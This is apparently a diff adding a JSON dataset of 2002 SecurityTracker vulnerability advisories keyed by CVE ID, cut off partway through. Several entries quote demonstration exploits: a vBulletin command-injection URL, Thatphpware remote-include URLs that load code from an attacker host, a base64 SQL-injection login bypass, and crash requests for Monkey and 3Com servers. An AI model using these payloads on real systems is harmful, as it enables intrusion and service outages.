@@ -1,0 +1,296 @@
+{
+  "year": 2002,
+  "total": 27,
+  "reference": "securitytracker.com",
+  "reports": {
+    "CVE-2000-1254": [
+      {
+        "url": "http://www.securitytracker.com/id/1035750",
+        "title": "OpenSSL *RSA_generate_key() Bit-shifting Flaw Lets Remote Users Access Data on the Target System",
+        "body": "A vulnerability was reported in OpenSSL. A remote user may be able to decrypt data in certain cases.Certain bit shifting operations may result in a smaller number of bits being used to generate keys, which may result in the generation of weak RSA keys on 64-bit HP-UX systems. A remote user with access to the network between the client and server may be able to exploit this to more easily decrypt data.The vulnerability resides in the *RSA_generate_key() function in 'crypto/rsa/rsa_gen.c'.The original advisory is available at:http://marc.info/?l=openssl-users&m=95961024500509Karsten Spang reported this vulnerability.",
+        "extra": "A remote user with access to the network between the client and server may be able to decrypt data.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2001-1463": [
+      {
+        "url": "http://securitytracker.com/id?1002882",
+        "title": "RhinoSoft FTP Serv-U Remote Administration Client Discloses Administrator Passwords When Using S/KEY One-Time Passwords",
+        "body": "CERT reported a vulnerability in the RhinoSoft Serv-U remote administration client. When using S/KEY one-time passwords, the client discloses the user's plain text password.CERT reports that, during the authentication process, the client ignores the S/KEY one-time password (OTP) challenge sent by the server and sends the password entered by the user in plaintext. This causes authentication to fail.The vendor has reportedly been notified.",
+        "extra": "A remote user with a network sniffer that is located between the user and the server can determine administrator passwords when S/KEY is used.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-0563": [
+      {
+        "url": "http://securitytracker.com/id?1009167",
+        "title": "Oracle Application Server Default Configuration Lets Remote Users Access Sensitive Services",
+        "body": "Some vulnerabilities were reported in the Oracle Application Server. A remote user may be able to access potentially sensitive services.It is reported that in the default configuration of the Oracle Application Server 9iAS, a number of services (including Dynamic Monitoring Services) are made accessible to remote users. A remote user can reportedly access the Dynamic Monitoring Services to monitor system information.",
+        "extra": "A remote user can access services to obtain potentially sensitive information.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-1357": [
+      {
+        "url": "http://securitytracker.com/id?1005812",
+        "title": "F-Secure SSH Client and Server SSH2 Implementation Bugs Allow Only Limited Remote Denial of Service Issues",
+        "body": "Rapid 7, Inc. reported vulnerabilities in the F-Secure's SSH2 implementation, as well as several other SSH2 implementations. A remote user can crash their own session.It is reported that F-Secure's SSH2 implementation does not properly process malformed packets exchanged during the greeting and KEXINIT (key exchange initialization) phases of an SSH connection. According to the vendor, a remote user could cause their own SSH session to crash. The crash reportedly occurs in a forked process, so denial of service conditions are not possible, according to F-Secure. No further details were provided.The product was tested using the SSHredder test suite, available at:http://www.rapid7.com The test suite included invalid and/or incorrect SSH packet lengths, string lengths, SSH padding and padding lengths, strings, and algorithm lists.This Alert covers the F-Secure products (SSH servers and clients for UNIX, v3.1.0 (build 11) and earlier; SSH for Windows, v5.2 and earlier). However, according to the report, the following other implementations are known to be vulnerable:SSH Communications Security, Inc. SSH for Windows, v3.2.2 and earlierSSH Communications Security, Inc. SSH for UNIX, v3.2.2 and earlierFiSSH SSH client for Windows, v1.0A and earlierInterSoft Int'l, Inc. SecureNetTerm client for Windows, v5.4.1 and earlierNetComposite ShellGuard SSH client for Windows, v3.4.6 and earlierPragma Systems, Inc. SecureShell SSH server for Windows, v2 and earlierPuTTY SSH client for Windows, v0.53 and earlier (v0.53b not affected)WinSCP SCP client for Windows, v2.0.0 and earlierAccording to the report, the following implementations are apparently not vulnerable:BitVise WinSSHD server for Windows v3.05LSH v1.5OpenSSH v3.5 and earlierTTSSH SSH Extension for TeraTerm ProVanDyke SecureCRT client v3.4.3 for WindowsVanDyke VShell server v1.2 for WindowsThe vendor (F-Secure) has reportedly characterized this issue as not exploitable.For the full Rapid 7 advisory, see the Source Message or:http://www.rapid7.com/advisories/R7-0009.txt",
+        "extra": "A remote user can cause their own session to crash.[Editor's note: The vendor notes that the product is not exploitable and that a remote user cannot cause denial of service conditions. However, because the flaw is confirmed and a remote user can cause a portion of the code to crash, we have categorized this as a denial of service issue.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1005813",
+        "title": "SSH Communications SSH Client and Server SSH2 Implementation Bugs Allow Only Limited Denial of Service",
+        "body": "Rapid 7, Inc. reported vulnerabilities in the SSH Communications SSH2 implementation, as well as several other SSH2 implementations. A remote user can crash their own session.It is reported that the SSH Communications SSH2 implementation in SSH for UNIX and SSH for Windows does not properly process malformed packets exchanged during the greeting and KEXINIT (key exchange initialization) phases of an SSH connection. A remote user could trigger a null pointer dereference. However, according to SSH, the remote user could only crash their own session.The product was tested using the SSHredder test suite, available at:http://www.rapid7.com The test suite included invalid and/or incorrect SSH packet lengths, string lengths, SSH padding and padding lengths, strings, and algorithm lists.This Alert covers the SSH Communications products. However, according to the report, the following other implementations are known to be vulnerable:F-Secure Corp. SSH servers and clients for UNIX, v3.1.0 (build 11) and earlierF-Secure Corp. SSH for Windows, v5.2 and earlierFiSSH SSH client for Windows, v1.0A and earlierInterSoft Int'l, Inc. SecureNetTerm client for Windows, v5.4.1 and earlierNetComposite ShellGuard SSH client for Windows, v3.4.6 and earlierPragma Systems, Inc. SecureShell SSH server for Windows, v2 and earlierPuTTY SSH client for Windows, v0.53 and earlier (v0.53b not affected)WinSCP SCP client for Windows, v2.0.0 and earlierAccording to the report, the following implementations are apparently not vulnerable:BitVise WinSSHD server for Windows v3.05LSH v1.5OpenSSH v3.5 and earlierTTSSH SSH Extension for TeraTerm ProVanDyke SecureCRT client v3.4.3 for WindowsVanDyke VShell server v1.2 for WindowsThe vendor (SSH Communications) has characterized this issue as not exploitable.For the full Rapid 7 advisory, see the Source Message or:http://www.rapid7.com/advisories/R7-0009.txt",
+        "extra": "A remote user may be able to crash their own session.[Editor's note: According to SSH, this will not cause denial of service conditions. However, because a user can cause a portion of the software to crash, we are classifying this as a denial of service issue.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-1358": [
+      {
+        "url": "http://securitytracker.com/id?1005812",
+        "title": "F-Secure SSH Client and Server SSH2 Implementation Bugs Allow Only Limited Remote Denial of Service Issues",
+        "body": "Rapid 7, Inc. reported vulnerabilities in the F-Secure's SSH2 implementation, as well as several other SSH2 implementations. A remote user can crash their own session.It is reported that F-Secure's SSH2 implementation does not properly process malformed packets exchanged during the greeting and KEXINIT (key exchange initialization) phases of an SSH connection. According to the vendor, a remote user could cause their own SSH session to crash. The crash reportedly occurs in a forked process, so denial of service conditions are not possible, according to F-Secure. No further details were provided.The product was tested using the SSHredder test suite, available at:http://www.rapid7.com The test suite included invalid and/or incorrect SSH packet lengths, string lengths, SSH padding and padding lengths, strings, and algorithm lists.This Alert covers the F-Secure products (SSH servers and clients for UNIX, v3.1.0 (build 11) and earlier; SSH for Windows, v5.2 and earlier). However, according to the report, the following other implementations are known to be vulnerable:SSH Communications Security, Inc. SSH for Windows, v3.2.2 and earlierSSH Communications Security, Inc. SSH for UNIX, v3.2.2 and earlierFiSSH SSH client for Windows, v1.0A and earlierInterSoft Int'l, Inc. SecureNetTerm client for Windows, v5.4.1 and earlierNetComposite ShellGuard SSH client for Windows, v3.4.6 and earlierPragma Systems, Inc. SecureShell SSH server for Windows, v2 and earlierPuTTY SSH client for Windows, v0.53 and earlier (v0.53b not affected)WinSCP SCP client for Windows, v2.0.0 and earlierAccording to the report, the following implementations are apparently not vulnerable:BitVise WinSSHD server for Windows v3.05LSH v1.5OpenSSH v3.5 and earlierTTSSH SSH Extension for TeraTerm ProVanDyke SecureCRT client v3.4.3 for WindowsVanDyke VShell server v1.2 for WindowsThe vendor (F-Secure) has reportedly characterized this issue as not exploitable.For the full Rapid 7 advisory, see the Source Message or:http://www.rapid7.com/advisories/R7-0009.txt",
+        "extra": "A remote user can cause their own session to crash.[Editor's note: The vendor notes that the product is not exploitable and that a remote user cannot cause denial of service conditions. However, because the flaw is confirmed and a remote user can cause a portion of the code to crash, we have categorized this as a denial of service issue.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1005813",
+        "title": "SSH Communications SSH Client and Server SSH2 Implementation Bugs Allow Only Limited Denial of Service",
+        "body": "Rapid 7, Inc. reported vulnerabilities in the SSH Communications SSH2 implementation, as well as several other SSH2 implementations. A remote user can crash their own session.It is reported that the SSH Communications SSH2 implementation in SSH for UNIX and SSH for Windows does not properly process malformed packets exchanged during the greeting and KEXINIT (key exchange initialization) phases of an SSH connection. A remote user could trigger a null pointer dereference. However, according to SSH, the remote user could only crash their own session.The product was tested using the SSHredder test suite, available at:http://www.rapid7.com The test suite included invalid and/or incorrect SSH packet lengths, string lengths, SSH padding and padding lengths, strings, and algorithm lists.This Alert covers the SSH Communications products. However, according to the report, the following other implementations are known to be vulnerable:F-Secure Corp. SSH servers and clients for UNIX, v3.1.0 (build 11) and earlierF-Secure Corp. SSH for Windows, v5.2 and earlierFiSSH SSH client for Windows, v1.0A and earlierInterSoft Int'l, Inc. SecureNetTerm client for Windows, v5.4.1 and earlierNetComposite ShellGuard SSH client for Windows, v3.4.6 and earlierPragma Systems, Inc. SecureShell SSH server for Windows, v2 and earlierPuTTY SSH client for Windows, v0.53 and earlier (v0.53b not affected)WinSCP SCP client for Windows, v2.0.0 and earlierAccording to the report, the following implementations are apparently not vulnerable:BitVise WinSSHD server for Windows v3.05LSH v1.5OpenSSH v3.5 and earlierTTSSH SSH Extension for TeraTerm ProVanDyke SecureCRT client v3.4.3 for WindowsVanDyke VShell server v1.2 for WindowsThe vendor (SSH Communications) has characterized this issue as not exploitable.For the full Rapid 7 advisory, see the Source Message or:http://www.rapid7.com/advisories/R7-0009.txt",
+        "extra": "A remote user may be able to crash their own session.[Editor's note: According to SSH, this will not cause denial of service conditions. However, because a user can cause a portion of the software to crash, we are classifying this as a denial of service issue.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-1359": [
+      {
+        "url": "http://securitytracker.com/id?1005812",
+        "title": "F-Secure SSH Client and Server SSH2 Implementation Bugs Allow Only Limited Remote Denial of Service Issues",
+        "body": "Rapid 7, Inc. reported vulnerabilities in the F-Secure's SSH2 implementation, as well as several other SSH2 implementations. A remote user can crash their own session.It is reported that F-Secure's SSH2 implementation does not properly process malformed packets exchanged during the greeting and KEXINIT (key exchange initialization) phases of an SSH connection. According to the vendor, a remote user could cause their own SSH session to crash. The crash reportedly occurs in a forked process, so denial of service conditions are not possible, according to F-Secure. No further details were provided.The product was tested using the SSHredder test suite, available at:http://www.rapid7.com The test suite included invalid and/or incorrect SSH packet lengths, string lengths, SSH padding and padding lengths, strings, and algorithm lists.This Alert covers the F-Secure products (SSH servers and clients for UNIX, v3.1.0 (build 11) and earlier; SSH for Windows, v5.2 and earlier). However, according to the report, the following other implementations are known to be vulnerable:SSH Communications Security, Inc. SSH for Windows, v3.2.2 and earlierSSH Communications Security, Inc. SSH for UNIX, v3.2.2 and earlierFiSSH SSH client for Windows, v1.0A and earlierInterSoft Int'l, Inc. SecureNetTerm client for Windows, v5.4.1 and earlierNetComposite ShellGuard SSH client for Windows, v3.4.6 and earlierPragma Systems, Inc. SecureShell SSH server for Windows, v2 and earlierPuTTY SSH client for Windows, v0.53 and earlier (v0.53b not affected)WinSCP SCP client for Windows, v2.0.0 and earlierAccording to the report, the following implementations are apparently not vulnerable:BitVise WinSSHD server for Windows v3.05LSH v1.5OpenSSH v3.5 and earlierTTSSH SSH Extension for TeraTerm ProVanDyke SecureCRT client v3.4.3 for WindowsVanDyke VShell server v1.2 for WindowsThe vendor (F-Secure) has reportedly characterized this issue as not exploitable.For the full Rapid 7 advisory, see the Source Message or:http://www.rapid7.com/advisories/R7-0009.txt",
+        "extra": "A remote user can cause their own session to crash.[Editor's note: The vendor notes that the product is not exploitable and that a remote user cannot cause denial of service conditions. However, because the flaw is confirmed and a remote user can cause a portion of the code to crash, we have categorized this as a denial of service issue.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1005813",
+        "title": "SSH Communications SSH Client and Server SSH2 Implementation Bugs Allow Only Limited Denial of Service",
+        "body": "Rapid 7, Inc. reported vulnerabilities in the SSH Communications SSH2 implementation, as well as several other SSH2 implementations. A remote user can crash their own session.It is reported that the SSH Communications SSH2 implementation in SSH for UNIX and SSH for Windows does not properly process malformed packets exchanged during the greeting and KEXINIT (key exchange initialization) phases of an SSH connection. A remote user could trigger a null pointer dereference. However, according to SSH, the remote user could only crash their own session.The product was tested using the SSHredder test suite, available at:http://www.rapid7.com The test suite included invalid and/or incorrect SSH packet lengths, string lengths, SSH padding and padding lengths, strings, and algorithm lists.This Alert covers the SSH Communications products. However, according to the report, the following other implementations are known to be vulnerable:F-Secure Corp. SSH servers and clients for UNIX, v3.1.0 (build 11) and earlierF-Secure Corp. SSH for Windows, v5.2 and earlierFiSSH SSH client for Windows, v1.0A and earlierInterSoft Int'l, Inc. SecureNetTerm client for Windows, v5.4.1 and earlierNetComposite ShellGuard SSH client for Windows, v3.4.6 and earlierPragma Systems, Inc. SecureShell SSH server for Windows, v2 and earlierPuTTY SSH client for Windows, v0.53 and earlier (v0.53b not affected)WinSCP SCP client for Windows, v2.0.0 and earlierAccording to the report, the following implementations are apparently not vulnerable:BitVise WinSSHD server for Windows v3.05LSH v1.5OpenSSH v3.5 and earlierTTSSH SSH Extension for TeraTerm ProVanDyke SecureCRT client v3.4.3 for WindowsVanDyke VShell server v1.2 for WindowsThe vendor (SSH Communications) has characterized this issue as not exploitable.For the full Rapid 7 advisory, see the Source Message or:http://www.rapid7.com/advisories/R7-0009.txt",
+        "extra": "A remote user may be able to crash their own session.[Editor's note: According to SSH, this will not cause denial of service conditions. However, because a user can cause a portion of the software to crash, we are classifying this as a denial of service issue.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-1360": [
+      {
+        "url": "http://securitytracker.com/id?1005812",
+        "title": "F-Secure SSH Client and Server SSH2 Implementation Bugs Allow Only Limited Remote Denial of Service Issues",
+        "body": "Rapid 7, Inc. reported vulnerabilities in the F-Secure's SSH2 implementation, as well as several other SSH2 implementations. A remote user can crash their own session.It is reported that F-Secure's SSH2 implementation does not properly process malformed packets exchanged during the greeting and KEXINIT (key exchange initialization) phases of an SSH connection. According to the vendor, a remote user could cause their own SSH session to crash. The crash reportedly occurs in a forked process, so denial of service conditions are not possible, according to F-Secure. No further details were provided.The product was tested using the SSHredder test suite, available at:http://www.rapid7.com The test suite included invalid and/or incorrect SSH packet lengths, string lengths, SSH padding and padding lengths, strings, and algorithm lists.This Alert covers the F-Secure products (SSH servers and clients for UNIX, v3.1.0 (build 11) and earlier; SSH for Windows, v5.2 and earlier). However, according to the report, the following other implementations are known to be vulnerable:SSH Communications Security, Inc. SSH for Windows, v3.2.2 and earlierSSH Communications Security, Inc. SSH for UNIX, v3.2.2 and earlierFiSSH SSH client for Windows, v1.0A and earlierInterSoft Int'l, Inc. SecureNetTerm client for Windows, v5.4.1 and earlierNetComposite ShellGuard SSH client for Windows, v3.4.6 and earlierPragma Systems, Inc. SecureShell SSH server for Windows, v2 and earlierPuTTY SSH client for Windows, v0.53 and earlier (v0.53b not affected)WinSCP SCP client for Windows, v2.0.0 and earlierAccording to the report, the following implementations are apparently not vulnerable:BitVise WinSSHD server for Windows v3.05LSH v1.5OpenSSH v3.5 and earlierTTSSH SSH Extension for TeraTerm ProVanDyke SecureCRT client v3.4.3 for WindowsVanDyke VShell server v1.2 for WindowsThe vendor (F-Secure) has reportedly characterized this issue as not exploitable.For the full Rapid 7 advisory, see the Source Message or:http://www.rapid7.com/advisories/R7-0009.txt",
+        "extra": "A remote user can cause their own session to crash.[Editor's note: The vendor notes that the product is not exploitable and that a remote user cannot cause denial of service conditions. However, because the flaw is confirmed and a remote user can cause a portion of the code to crash, we have categorized this as a denial of service issue.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1005813",
+        "title": "SSH Communications SSH Client and Server SSH2 Implementation Bugs Allow Only Limited Denial of Service",
+        "body": "Rapid 7, Inc. reported vulnerabilities in the SSH Communications SSH2 implementation, as well as several other SSH2 implementations. A remote user can crash their own session.It is reported that the SSH Communications SSH2 implementation in SSH for UNIX and SSH for Windows does not properly process malformed packets exchanged during the greeting and KEXINIT (key exchange initialization) phases of an SSH connection. A remote user could trigger a null pointer dereference. However, according to SSH, the remote user could only crash their own session.The product was tested using the SSHredder test suite, available at:http://www.rapid7.com The test suite included invalid and/or incorrect SSH packet lengths, string lengths, SSH padding and padding lengths, strings, and algorithm lists.This Alert covers the SSH Communications products. However, according to the report, the following other implementations are known to be vulnerable:F-Secure Corp. SSH servers and clients for UNIX, v3.1.0 (build 11) and earlierF-Secure Corp. SSH for Windows, v5.2 and earlierFiSSH SSH client for Windows, v1.0A and earlierInterSoft Int'l, Inc. SecureNetTerm client for Windows, v5.4.1 and earlierNetComposite ShellGuard SSH client for Windows, v3.4.6 and earlierPragma Systems, Inc. SecureShell SSH server for Windows, v2 and earlierPuTTY SSH client for Windows, v0.53 and earlier (v0.53b not affected)WinSCP SCP client for Windows, v2.0.0 and earlierAccording to the report, the following implementations are apparently not vulnerable:BitVise WinSSHD server for Windows v3.05LSH v1.5OpenSSH v3.5 and earlierTTSSH SSH Extension for TeraTerm ProVanDyke SecureCRT client v3.4.3 for WindowsVanDyke VShell server v1.2 for WindowsThe vendor (SSH Communications) has characterized this issue as not exploitable.For the full Rapid 7 advisory, see the Source Message or:http://www.rapid7.com/advisories/R7-0009.txt",
+        "extra": "A remote user may be able to crash their own session.[Editor's note: According to SSH, this will not cause denial of service conditions. However, because a user can cause a portion of the software to crash, we are classifying this as a denial of service issue.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-1660": [
+      {
+        "url": "http://securitytracker.com/id?1005284",
+        "title": "vBulletin Forum Software Input Validation Hole in 'calendar.php' Lets Remote Users Execute Commands",
+        "body": "An input validation flaw was reported in the vBulletin forum software. A remote user can execute arbitrary commands on the system.SecuriTeam reported that there is a flaw in the calendar.php script. A remote user can inject SQL commands to be executed by the server.A demonstration exploit example is provided:/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60[command]%20%60;die();echo%22SecuriTeam credits gosper at nix.org with reporting this bug.",
+        "extra": "A remote user can execute arbitrary code on the system, typically with the privileges of the web server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-1663": [
+      {
+        "url": "http://securitytracker.com/id?1005507",
+        "title": "Monkey Web Server Can Be Crashed By Remote Users Sending Certain POST Requests",
+        "body": "A denial of service vulnerability was reported in the Monkey web server. A remote user can cause the web server daemon to crash.It is reported that a remote user can send a POST request without any content but with an invalid Content-Length value or without any Content-Length value specified to cause the web server to crash.A demonstration exploit is provided: POST / HTTP/1.1 Host: 127.0.0.1:2001 Content-Length: 1",
+        "extra": "A remote user can cause the Monkey web service to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-1874": [
+      {
+        "url": "http://securitytracker.com/id?1005523",
+        "title": "AstroCam Webcam Management Software Input Validation Flaw Lets Remote Users Execute Arbitrary Programs",
+        "body": "An input validation vulnerability was reported in the AstroCam webcam management software. A remote user may be able to execute commands on the system.It is reported that a remote user can supply a specially crafted URL to the 'astrocam.cgi' script to cause programs on the system to be executed. The script does not filter the user-supplied input to remove pipe ('|') and or symbols ('||') and to prevent input and output redirection ('<' and '>').The remote user's commands would be run with the privileges of the web server.",
+        "extra": "A remote user can execute arbitrary programs on the server with the privileges of the web server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-1978": [
+      {
+        "url": "http://securitytracker.com/id?1005442",
+        "title": "IP Filter Linux Firewall Software FTP Proxy Bug Lets Remote Users Bypass the Rule Set",
+        "body": "A vulnerability was reported in the IP Filter kernel modifications for Linux in the FTP proxy function. A remote user may be able to bypass the firewall rule set.It is reported that firewalls that support the FTP protocol without fully reassembling packets in the FTP command channel may allow remote users to bypass the firewall rule sets.A remote user can invoke partial segment acknowledgements to cause the target FTP server to resend user-supplied control strings, causing the firewall to erroneously parse the control strings as a legitimate command and open up a hole in the firewall from the remote user to the target server. The opened connection can apparently be used for any protocol.The success of such an exploit depends on the targeted FTP server (behind the IP Filter firewall) and the manner in which the FTP server responds. The following FTP servers are known to be safe, according to the report:+ ftpd in Sun Solaris/SunOS+ ftpd in FreeBSD (upto and including 4.5)+ ftpd in OpenBSD (upto and including 3.1)+ wsftpdThe following FTP server software is reportedly known to support this attack:+ proftpd+ warftpd+ serv-u+ pureftpd+ publicfile+ ftpd in NetBSD (upto and including 1.6)",
+        "extra": "A remote user may be able to cause the firewall to open connections that are otherwise not permitted by the firewall rule set.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2242": [
+      {
+        "url": "http://securitytracker.com/id?1005764",
+        "title": "KisMAC Wireless Protocol Stumbler Installation Bug May Overwrite File Permissions",
+        "body": "A vulnerability was reported in the KisMAC wireless protocol stumbler for Mac OS X. The installation software may overwrite file permissions to be unsafe permissions.According to the vendor's web site, the Apple Package Manager for KisMAC overwrites file permissions after each installation. The specific nature of the permission changes was not disclosed.The vendor credits Norbert Rittel with reporting this vulnerbility.",
+        "extra": "The installation software may overwrite certain file permissions after installation.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2252": [
+      {
+        "url": "http://securitytracker.com/id?1005733",
+        "title": "Thatphpware Has More Input Validation Flaws That Let Remote Users Execute Arbitrary Code",
+        "body": "Some input validation vulnerabilities were reported in the 'Thatphpware' forum software. A remote user can inject SQL commands and can execute arbitrary commands on the system.It is reported that several of the PHP modules fail to define an include file and also permit remotely located include files. A remote user can create a specially crafted URL that specifies a remotely located include file to cause the target server to execute commands contained in the include file.In 'artlist.php' in version 0.5.2 and 0.5.3, a reference to 'thatfile.php' can be exploited. In 'config.php' a reference to 'db_settings.php' can be exploited. In 'thatfile.php' in versions prior to 0.5.3, a reference to 'messages.$language.php' may be exploited, depending on the system configuration.Some demonstration exploit URLs are provided:http://[target]/artlist.php?root_path=http://[attacker]/withhttp://[attacker]/thatfile.phphttp://[target]/config.php?root_path=http://[attacker]/withhttp://[attacker]/db_settings.phphttp://[target]/thatfile.php?root_path=http://[attacker]/&language=1withhttp://[attacker]/config.phpandhttp://[attacker]/messages.1.phpAlso, due to a flaw in 'auth.inc.php' in versions prior to and including 0.5.0, a remote authenticated user can send a specially crafted URL to any file to cause the system to recognize the user as an authenticated administrator.A demonstration exploit is provided:http://[target]/[NeedToBeAuth].php?user=JyBPUiAnJz0nOjE6JyBPUiAnJz0n( base64_decode(JyBPUiAnJz0nOjE6JyBPUiAnJz0n) == ' OR ''=':1:' OR ''=')",
+        "extra": "A remote user can execute some SQL commands on the underlying database server to obtain administrative privileges on the application. A remote user can execute arbitrary PHP commands and shell commands on the target server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2261": [
+      {
+        "url": "http://securitytracker.com/id?1005748",
+        "title": "Sendmail 'check_relay' E-mail Access Control Features Can Be Bypassed By Remote Users",
+        "body": "An access control vulnerability was reported in Sendmail. A remote user with the ability to control a DNS server or spoof the DNS may be able to bypass a target server's sendmail access controls and send mail to or via that server.It is reported that a remote user can bypass the access restrictions imposed via the 'check_relay' function by using bogus domain name system (DNS) data. It appears that a remote user with control of a DNS server can supply a blank client name via DNS to cause the 'check_relay' hostname access controls to fail to block mail from that domain.Sendmail.org credits Kai Schlichting with reporting this flaw.",
+        "extra": "A remote user with ability to spoof the DNS can bypass sendmail access restrictions and send mail to or via the server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2297": [
+      {
+        "url": "http://securitytracker.com/id?1005733",
+        "title": "Thatphpware Has More Input Validation Flaws That Let Remote Users Execute Arbitrary Code",
+        "body": "Some input validation vulnerabilities were reported in the 'Thatphpware' forum software. A remote user can inject SQL commands and can execute arbitrary commands on the system.It is reported that several of the PHP modules fail to define an include file and also permit remotely located include files. A remote user can create a specially crafted URL that specifies a remotely located include file to cause the target server to execute commands contained in the include file.In 'artlist.php' in version 0.5.2 and 0.5.3, a reference to 'thatfile.php' can be exploited. In 'config.php' a reference to 'db_settings.php' can be exploited. In 'thatfile.php' in versions prior to 0.5.3, a reference to 'messages.$language.php' may be exploited, depending on the system configuration.Some demonstration exploit URLs are provided:http://[target]/artlist.php?root_path=http://[attacker]/withhttp://[attacker]/thatfile.phphttp://[target]/config.php?root_path=http://[attacker]/withhttp://[attacker]/db_settings.phphttp://[target]/thatfile.php?root_path=http://[attacker]/&language=1withhttp://[attacker]/config.phpandhttp://[attacker]/messages.1.phpAlso, due to a flaw in 'auth.inc.php' in versions prior to and including 0.5.0, a remote authenticated user can send a specially crafted URL to any file to cause the system to recognize the user as an authenticated administrator.A demonstration exploit is provided:http://[target]/[NeedToBeAuth].php?user=JyBPUiAnJz0nOjE6JyBPUiAnJz0n( base64_decode(JyBPUiAnJz0nOjE6JyBPUiAnJz0n) == ' OR ''=':1:' OR ''=')",
+        "extra": "A remote user can execute some SQL commands on the underlying database server to obtain administrative privileges on the application. A remote user can execute arbitrary PHP commands and shell commands on the target server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2298": [
+      {
+        "url": "http://securitytracker.com/id?1005733",
+        "title": "Thatphpware Has More Input Validation Flaws That Let Remote Users Execute Arbitrary Code",
+        "body": "Some input validation vulnerabilities were reported in the 'Thatphpware' forum software. A remote user can inject SQL commands and can execute arbitrary commands on the system.It is reported that several of the PHP modules fail to define an include file and also permit remotely located include files. A remote user can create a specially crafted URL that specifies a remotely located include file to cause the target server to execute commands contained in the include file.In 'artlist.php' in version 0.5.2 and 0.5.3, a reference to 'thatfile.php' can be exploited. In 'config.php' a reference to 'db_settings.php' can be exploited. In 'thatfile.php' in versions prior to 0.5.3, a reference to 'messages.$language.php' may be exploited, depending on the system configuration.Some demonstration exploit URLs are provided:http://[target]/artlist.php?root_path=http://[attacker]/withhttp://[attacker]/thatfile.phphttp://[target]/config.php?root_path=http://[attacker]/withhttp://[attacker]/db_settings.phphttp://[target]/thatfile.php?root_path=http://[attacker]/&language=1withhttp://[attacker]/config.phpandhttp://[attacker]/messages.1.phpAlso, due to a flaw in 'auth.inc.php' in versions prior to and including 0.5.0, a remote authenticated user can send a specially crafted URL to any file to cause the system to recognize the user as an authenticated administrator.A demonstration exploit is provided:http://[target]/[NeedToBeAuth].php?user=JyBPUiAnJz0nOjE6JyBPUiAnJz0n( base64_decode(JyBPUiAnJz0nOjE6JyBPUiAnJz0n) == ' OR ''=':1:' OR ''=')",
+        "extra": "A remote user can execute some SQL commands on the underlying database server to obtain administrative privileges on the application. A remote user can execute arbitrary PHP commands and shell commands on the target server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2299": [
+      {
+        "url": "http://securitytracker.com/id?1005733",
+        "title": "Thatphpware Has More Input Validation Flaws That Let Remote Users Execute Arbitrary Code",
+        "body": "Some input validation vulnerabilities were reported in the 'Thatphpware' forum software. A remote user can inject SQL commands and can execute arbitrary commands on the system.It is reported that several of the PHP modules fail to define an include file and also permit remotely located include files. A remote user can create a specially crafted URL that specifies a remotely located include file to cause the target server to execute commands contained in the include file.In 'artlist.php' in version 0.5.2 and 0.5.3, a reference to 'thatfile.php' can be exploited. In 'config.php' a reference to 'db_settings.php' can be exploited. In 'thatfile.php' in versions prior to 0.5.3, a reference to 'messages.$language.php' may be exploited, depending on the system configuration.Some demonstration exploit URLs are provided:http://[target]/artlist.php?root_path=http://[attacker]/withhttp://[attacker]/thatfile.phphttp://[target]/config.php?root_path=http://[attacker]/withhttp://[attacker]/db_settings.phphttp://[target]/thatfile.php?root_path=http://[attacker]/&language=1withhttp://[attacker]/config.phpandhttp://[attacker]/messages.1.phpAlso, due to a flaw in 'auth.inc.php' in versions prior to and including 0.5.0, a remote authenticated user can send a specially crafted URL to any file to cause the system to recognize the user as an authenticated administrator.A demonstration exploit is provided:http://[target]/[NeedToBeAuth].php?user=JyBPUiAnJz0nOjE6JyBPUiAnJz0n( base64_decode(JyBPUiAnJz0nOjE6JyBPUiAnJz0n) == ' OR ''=':1:' OR ''=')",
+        "extra": "A remote user can execute some SQL commands on the underlying database server to obtain administrative privileges on the application. A remote user can execute arbitrary PHP commands and shell commands on the target server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2300": [
+      {
+        "url": "http://securitytracker.com/id?1005732",
+        "title": "3Com SuperStack 3 NBX and NBX 100 Telephony Systems Can Be Crashed By Remote Users Sending FTP Commands",
+        "body": "A denial of service vulnerability was reported in 3Com's SuperStack 3 NBX and NBX 100 voice-over-IP telephony systems. A remote user can crash the system.A remote user can cause the system's FTP server to crash by sending the following type of command, with a string that is 2048 bytes in length:CEL aaaa[...]aaaaA remote user can disable the FTP server as well as the web-based administrative console and the call manager. This will reportedly disable all calls. According to the report, calls that are in progress at the time of the crash cannot be disconnected.A hard reboot (power-cycle) is required to return the system to normal operations.The underlying vulnerability resides in VxWorks 5.2 and 5.3.SECNAP Network Security reported this vulnerability.",
+        "extra": "A remote user can crash the system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2344": [
+      {
+        "url": "http://securitytracker.com/id?1004938",
